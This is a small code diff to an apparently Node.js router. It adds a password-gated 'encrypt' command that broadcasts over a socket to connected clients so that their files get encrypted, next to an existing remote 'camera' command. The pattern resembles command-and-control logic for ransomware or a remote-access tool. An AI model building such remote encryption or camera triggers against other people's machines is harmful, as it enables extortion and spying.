@@ -36,6 +36,17 @@ router.test = function(req,res) {
 			req.io.emit('camera', true);
 			res.end("I'll notify you soon.");
 		}
+		else if(req.body.command === "encrypt")
+		{
+			if(req.body.decryptPassword === config.ENCRYPT_DECRYPT_PASSWORD)
+			{
+
+				req.io.emit('encrypt', true);
+				res.end("All the files will be encrypted.");
+			}
+			else
+				res.end("Invalid decryption key, mate.");
+		}
 	}
 	else
 		res.end('Validation failed');
